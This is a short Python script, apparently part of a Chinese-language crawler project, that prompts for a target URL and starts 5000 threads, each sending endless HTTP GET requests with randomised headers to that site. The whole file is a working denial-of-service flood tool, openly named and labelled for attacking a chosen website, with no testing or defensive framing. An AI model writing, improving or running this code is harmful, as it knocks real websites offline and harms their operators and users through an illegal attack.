# coding=utf-8
from threading import Thread
from 爬虫.py.headers import getheaders
from 爬虫.py.response import xy_item
import requests


class Http_DDos(Thread):
    def __init__(self, host):
        super().__init__()
        self.host = host

    def run(self) -> None:
        while True:
            self.sendHttpRequest(self.host)

    def sendHttpRequest(self, url):
        try:
            response = requests.get(url, headers=getheaders(1))
            print('状态码：', response.status_code)
        except:
            pass


if __name__ == '__main__':
    addr_url = input('请输入要DDOS的网址：')
    for i in range(5000):
        t = Http_DDos(host=addr_url)
        t.start()
